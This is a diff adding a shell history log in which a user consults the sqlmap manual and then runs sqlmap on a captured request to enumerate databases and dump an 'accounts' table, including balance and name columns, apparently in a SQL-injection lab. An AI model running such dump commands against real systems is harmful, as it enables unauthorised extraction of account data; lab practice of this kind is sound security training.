@@ -1,0 +1,20 @@
+    1  man sqlmap | grep level
+    2  top
+    3  htop
+    4  top
+    5  man sqlmap | grep tamper
+    6  man sqlmap
+    7  cd /
+    8  ls
+    9  sqlmap -r /request.txt  --dbs
+   10  sqlmap -r /request.txt  -D information_schema --tables
+   11  sqlmap -r /request.txt  -D inject_2 --tables --threads=5
+   12  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts
+   13  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts --columns
+   14  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts --dump
+   15  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts -C balance
+   16  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts -C balance --dump
+   17  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts -C name --dump
+   18  sqlmap -r /request.txt  -D inject_2 --threads=5 -T accounts  --dump
+   19  history
+   20  history > terminal2.txt
